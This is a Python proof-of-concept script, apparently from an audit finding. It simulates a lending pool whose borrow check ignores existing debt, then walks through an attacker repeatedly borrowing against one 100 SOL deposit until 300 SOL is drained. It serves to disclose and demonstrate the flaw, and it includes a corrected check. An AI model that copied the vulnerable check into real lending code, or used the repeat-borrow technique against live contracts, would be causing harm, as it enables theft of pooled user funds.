"""Exploit PoC: Collateral check ignores existing debt (SEM-001).

Demonstrates that the borrow function allows unlimited borrowing
because it only checks deposited >= amount without considering
cumulative debt.
"""
from dataclasses import dataclass


@dataclass
class Pool:
    """Simulates the on-chain Pool account."""
    total_deposits: int = 0
    total_borrows: int = 0
    interest_rate: int = 500  # basis points


@dataclass
class UserAccount:
    """Simulates the on-chain UserAccount."""
    deposited: int = 0
    borrowed: int = 0


def deposit(pool: Pool, user: UserAccount, amount: int) -> None:
    """Simulates the deposit instruction."""
    user.deposited += amount
    pool.total_deposits += amount
    print(f"  deposit({amount}) -> deposited={user.deposited}, pool_deposits={pool.total_deposits}")


def borrow_vulnerable(pool: Pool, user: UserAccount, amount: int) -> bool:
    """Simulates the VULNERABLE borrow instruction.

    BUG: Only checks deposited >= amount, ignores existing borrows.
    """
    # This is the vulnerable check — should include user.borrowed
    if user.deposited >= amount:
        user.borrowed += amount
        pool.total_borrows += amount
        print(f"  borrow({amount}) -> APPROVED (deposited {user.deposited} >= {amount})")
        print(f"    cumulative debt: {user.borrowed}, pool_borrows: {pool.total_borrows}")
        return True
    else:
        print(f"  borrow({amount}) -> REJECTED")
        return False


def borrow_fixed(pool: Pool, user: UserAccount, amount: int) -> bool:
    """What the CORRECT borrow check should look like."""
    if user.deposited * 75 // 100 >= user.borrowed + amount:
        user.borrowed += amount
        pool.total_borrows += amount
        return True
    return False


def main():
    print("=" * 60)
    print("EXPLOIT: Collateral Check Ignores Existing Debt")
    print("=" * 60)

    pool = Pool()
    attacker = UserAccount()
    vault_balance = 1000  # Other users deposited 1000 SOL

    # Step 1: Attacker deposits 100 SOL
    print("\nStep 1: Attacker deposits 100 SOL")
    deposit(pool, attacker, 100)

    # Step 2: Borrow 100 SOL — should this pass?
    print("\nStep 2: First borrow of 100 SOL")
    assert borrow_vulnerable(pool, attacker, 100), "First borrow should pass"
    vault_balance -= 100

    # Step 3: Borrow 100 SOL AGAIN — this should fail but doesn't
    print("\nStep 3: Second borrow of 100 SOL (BUG: passes despite existing debt)")
    assert borrow_vulnerable(pool, attacker, 100), "Second borrow passes due to bug"
    vault_balance -= 100

    # Step 4: Borrow a third time
    print("\nStep 4: Third borrow of 100 SOL (BUG: still passes)")
    assert borrow_vulnerable(pool, attacker, 100), "Third borrow passes due to bug"
    vault_balance -= 100

    # Verify exploit succeeded
    print("\n" + "=" * 60)
    print("EXPLOIT RESULT:")
    print(f"  Attacker deposited:  100 SOL")
    print(f"  Attacker borrowed:   {attacker.borrowed} SOL")
    print(f"  Vault drained:       {300} SOL")
    print(f"  Debt ratio:          {attacker.borrowed / attacker.deposited:.0%} (should be <= 75%)")

    assert attacker.borrowed > attacker.deposited, (
        f"Exploit confirmed: borrowed {attacker.borrowed} > deposited {attacker.deposited}"
    )
    print("\n  >>> EXPLOIT CONFIRMED: Unlimited borrowing with fixed collateral <<<")
    print("=" * 60)


if __name__ == "__main__":
    main()
